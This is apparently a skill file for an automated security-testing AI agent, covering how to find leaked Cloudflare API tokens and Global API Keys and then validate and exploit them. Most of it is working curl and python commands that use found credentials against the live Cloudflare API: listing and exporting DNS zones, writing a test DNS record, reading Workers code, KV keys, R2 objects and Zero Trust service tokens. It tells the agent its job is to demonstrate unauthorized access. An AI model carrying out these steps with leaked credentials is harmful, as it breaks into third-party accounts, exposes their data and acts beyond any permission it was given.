---
name: cloudflare_credentials
description: Cloudflare API token detection, validation, scope enumeration, and exploitation — turn leaked CF credentials into demonstrated unauthorized access
---

# Cloudflare Credential Exploitation

Cloudflare API tokens, Global API Keys, and service tokens are high-value targets. A single leaked token can grant full control over DNS, firewall rules, Workers, access policies, and more. When you find a Cloudflare credential during recon (JS bundles, .env files, GitHub repos, error pages, config endpoints), your job is to VALIDATE it, ENUMERATE its scope, and DEMONSTRATE unauthorized access.

This is NOT a standalone skill — it extends `information_disclosure` with Cloudflare-specific credential chaining.

## Token Pattern Recognition

Scan all discovered text (JS bundles, source maps, config files, error responses, repo contents) for these patterns:

### Cloudflare API Tokens (scoped, most common)
```
v1.0-[a-f0-9]{2}-(base64_ish){40,}
```
Example: `v1.0-aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789-abCd`

### Global API Keys (legacy, full account access)
```
[a-f0-9]{37}
```
These look like hex strings exactly 37 chars long. Low confidence alone — validate before reporting.

### Global API Key Email (paired with key)
Search for email addresses near Global API Key patterns. The key requires the account email for authentication.

### Cloudflare Origin CA Tokens
```
v1.0-[a-f0-9]{2}-(base64_ish){24,}
```
Shorter than API tokens. Generate TLS certs for origin servers.

### Tunnel Service Tokens
```
[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}
```
UUID format. Used by `cloudflared` for tunnel authentication.

### Workers Service Bindings
Search for `CLOUDFLARE_API_TOKEN`, `CF_API_TOKEN`, `CF_API_KEY`, `CF_ZONE_ID`, `CF_ACCOUNT_ID` in env files and build configs.

### Detection in JS Bundles
```bash
# Scan downloaded bundle for CF tokens
grep -oE 'v1\.0-[a-zA-Z0-9]{2}-[a-zA-Z0-9_-]{20,}' /tmp/bundle.js
grep -oE 'CLOUDFLARE_API_TOKEN[=:]["\x27][^"\x27]+' /tmp/bundle.js
grep -oE 'CF_API_TOKEN[=:]["\x27][^"\x27]+' /tmp/bundle.js
grep -oE 'CF_API_KEY[=:]["\x27][^"\x27]+' /tmp/bundle.js
grep -oE 'CF_ZONE_ID[=:]["\x27][^"\x27]+' /tmp/bundle.js
grep -oE 'CF_ACCOUNT_ID[=:]["\x27][^"\x27]+' /tmp/bundle.js
```

### Detection in Config/Env Files
```bash
# .env, wrangler.toml, .dev.vars, next.config.js, etc.
grep -riE 'cloudflare|cf_api|cf_zone|cf_account|wrangler' /tmp/config_files/
grep -riE 'CLOUDFLARE_ACCOUNT_ID|CLOUDFLARE_API_TOKEN|CLOUDFLARE_ZONE_ID' /tmp/config_files/
```

### Detection in GitHub/Repos
```bash
# Search code for CF tokens (GitHub dork patterns)
# site:github.com "CLOUDFLARE_API_TOKEN" target.com
# site:github.com "v1.0-" "cloudflare" target.com
```

## Token Validation

NEVER report a token as a finding without validating it first. Use the Cloudflare API directly with curl — no CLI needed.

### Verify API Token
```bash
curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
  -H "Authorization: Bearer <FOUND_TOKEN>" \
  -H "Content-Type: application/json"
```

**Valid response:**
```json
{
  "success": true,
  "errors": [],
  "messages": [],
  "result": {
    "id": "token-id-here",
    "status": "active"
  }
}
```

**Invalid response:**
```json
{
  "success": false,
  "errors": [{"code": 10000, "message": "Invalid API Token"}]
}
```

### Verify Global API Key
```bash
# Requires the account email + the key
curl -s -X GET "https://api.cloudflare.com/client/v4/user" \
  -H "X-Auth-Email: <EMAIL>" \
  -H "X-Auth-Key: <GLOBAL_API_KEY>" \
  -H "Content-Type: application/json"
```

### Verify Origin CA Token
```bash
curl -s -X GET "https://api.cloudflare.com/client/v4/certificates" \
  -H "Authorization: Bearer <ORIGIN_CA_TOKEN>" \
  -H "Content-Type: application/json"
```

### Verify Tunnel Token
```bash
# Tunnel tokens authenticate cloudflared, not the API directly.
# But you can test with the API if the token has API permissions:
curl -s -X GET "https://api.cloudflare.com/client/v4/accounts" \
  -H "Authorization: Bearer <TUNNEL_TOKEN>" \
  -H "Content-Type: application/json"
```

## Scope Enumeration

Once validated, determine what the token can access. This is CRITICAL — scope determines severity.

### List Accessible Zones
```bash
curl -s "https://api.cloudflare.com/client/v4/zones" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" | python3 -c "
import sys, json
data = json.load(sys.stdin)
if data['success']:
    for z in data['result']:
        print(f\"Zone: {z['name']} (ID: {z['id']}, Status: {z['status']})\")
else:
    print(f\"No zone access: {data['errors']}\")
"
```

### List Accessible Accounts
```bash
curl -s "https://api.cloudflare.com/client/v4/accounts" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" | python3 -c "
import sys, json
data = json.load(sys.stdin)
if data['success']:
    for a in data['result']:
        print(f\"Account: {a['name']} (ID: {a['id']})\")
"
```

### Check Token Permissions (if token ID available from verify)
```bash
TOKEN_ID="<from verify response>"
curl -s "https://api.cloudflare.com/client/v4/user/tokens/$TOKEN_ID" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" | python3 -c "
import sys, json
data = json.load(sys.stdin)
if data['success']:
    for p in data['result'].get('policies', []):
        print(f\"Effect: {p['effect']}, Resources: {p['resources']}, Permissions: {p['permissions']}\")
"
```

### Check DNS Access
```bash
# For each zone found, try to list DNS records
curl -s "https://api.cloudflare.com/client/v4/zones/<ZONE_ID>/dns_records" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" | python3 -c "
import sys, json
data = json.load(sys.stdin)
if data['success']:
    print('DNS records accessible')
    for r in data['result'][:5]:
        print(f\"  {r['type']} {r['name']} -> {r['content']}\")
else:
    print(f\"No DNS access: {data['errors']}\")
"
```

### Check Workers Access
```bash
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/workers/scripts" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

### Check Zero Trust / Access Policies
```bash
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/access/policies" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

### Check Firewall Rules
```bash
curl -s "https://api.cloudflare.com/client/v4/zones/<ZONE_ID>/firewall/rules" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

### Check Page Rules
```bash
curl -s "https://api.cloudflare.com/client/v4/zones/<ZONE_ID>/pagerules" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

### Check KV Namespaces (Workers KV)
```bash
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/storage/kv/namespaces" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

### Check R2 Buckets
```bash
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/r2/buckets" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

### Check Service Tokens (Zero Trust)
```bash
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/access/service_tokens" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

### Check Workers Scripts (read code)
```bash
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/workers/scripts/<SCRIPT_NAME>" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

### Check KV Values (read stored data)
```bash
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/storage/kv/namespaces/<NAMESPACE_ID>/keys" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

### Check R2 Object Listing
```bash
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/r2/buckets/<BUCKET_NAME>/objects" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

## Exploitation — Demonstrating Unauthorized Access

The CREDENTIAL CHAINING RULE from `information_disclosure` applies: finding the token is recon, USING it is the finding.

### Minimal Exploitation Steps (pick based on scope)

**Read-only token with zone access:**
1. List DNS records — proves unauthorized DNS zone read access
2. List firewall/WAF rules — proves unauthorized security config read access
3. List page rules — proves unauthorized routing config read access
4. Export DNS zone file — full zone transfer, proves bulk data exfiltration

```bash
# Full zone file export — highest impact demonstration
curl -s "https://api.cloudflare.com/client/v4/zones/<ZONE_ID>/dns_records/export" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -o /tmp/zone_export.txt
# If this succeeds, you have a complete DNS zone file — proves full read access
```

**Token with write access:**
DO NOT modify production DNS — that's destructive and out of scope for bug bounty. Instead, demonstrate the capability by creating a harmless TXT record, then deleting it:

```bash
# Create a TXT record (harmless, proves write)
RECORD_ID=$(curl -s -X POST "https://api.cloudflare.com/client/v4/zones/<ZONE_ID>/dns_records" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"type":"TXT","name":"_prometheus-probe.target.com","content":"prometheus-write-test","ttl":60}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['id'])")

# Immediately delete it
curl -s -X DELETE "https://api.cloudflare.com/client/v4/zones/<ZONE_ID>/dns_records/$RECORD_ID" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

**Token with Workers access:**
```bash
# Read a Worker script — proves code access
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/workers/scripts/<SCRIPT_NAME>" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

**Token with R2 access:**
```bash
# List bucket contents — proves storage access
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/r2/buckets/<BUCKET_NAME>/objects" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

**Token with KV access:**
```bash
# List KV keys — proves key-value store access
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/storage/kv/namespaces/<NAMESPACE_ID>/keys" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

**Token with Zero Trust access:**
```bash
# List access policies — proves security policy read access
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/access/policies" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"

# List service tokens — proves ability to create/steal auth tokens
curl -s "https://api.cloudflare.com/client/v4/accounts/<ACCOUNT_ID>/access/service_tokens" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json"
```

## Severity Scoring

### Critical (CVSS 9.0+)
- Token with write access to DNS (can hijack domains, redirect traffic, intercept email)
- Token with access to Zero Trust policies (can bypass all access controls)
- Global API Key with account email (full account takeover)
- Token with Workers write access (can inject arbitrary code on all routes)

### High (CVSS 7.0-8.9)
- Token with read access to all zones (full DNS zone enumeration, zone file export)
- Token with access to R2/KV storage (data exfiltration)
- Token with access to firewall/WAF rules (security config disclosure)
- Origin CA token (can generate valid TLS certs for origin servers)

### Medium (CVSS 4.0-6.9)
- Token with read access to limited zones (not the target's primary zone)
- Tunnel service token (requires network access to use)
- Token with only account-level read (billing info, member list)

### Low (CVSS 0.1-3.9)
- Token that only verifies but has no zone/account permissions
- Expired or revoked token found in historical data

## Validation

1. Token MUST be validated via the CF API before reporting — grep matches alone are not findings
2. Scope MUST be enumerated — report what the token can access, not just that it exists
3. Exploitation MUST demonstrate unauthorized action — list DNS records, export zone, read Workers code
4. Evidence MUST include the raw API response showing success
5. Report MUST include: token type, how it was found (file path, URL, line number), what it accesses, demonstrated impact
6. IMMEDIATELY after testing, report the finding — do NOT store the token or continue using it beyond the minimum proof

## False Positives

- Tokens in documentation or example code (check if it's in a README/docs section)
- Tokens that verify as invalid or revoked
- Tokens with zero permissions (empty policy list)
- Tokens in public test/example repositories that are clearly not real
- Truncated tokens or tokens that are obviously placeholders

## Using the `cf` CLI (Optional)

If the `cf` CLI is available on the system, it can be used with found tokens directly:

```bash
# Set the found token as auth
export CLOUDFLARE_API_TOKEN="<FOUND_TOKEN>"

# Or pass directly
cf --api-token "<FOUND_TOKEN>" zones list
cf --api-token "<FOUND_TOKEN>" dns records list -z <ZONE_ID>
cf --api-token "<FOUND_TOKEN>" accounts list
```

The `cf` CLI provides cleaner output and pagination but is not required. Raw curl is more reliable in sandboxed environments.

## Pro Tips

1. CF API tokens can be scoped to specific zones — always check ALL zones, not just the first one that works
2. Workers often contain business logic and API keys for other services — read them if you can
3. R2 buckets are S3-compatible — if you get bucket access, check for sensitive data
4. Zero Trust service tokens can be stolen and reused — if you can list them, you can impersonate them
5. The DNS export endpoint (`/dns_records/export`) returns the full BIND zone file — high-value data
6. KV namespaces often store session tokens, feature flags, and cached API responses
7. Check for `CF_ACCOUNT_ID` in the same source where you found the token — speeds up enumeration
8. Cloudflare audit logs (`/accounts/{id}/audit_logs`) show who created the token and when
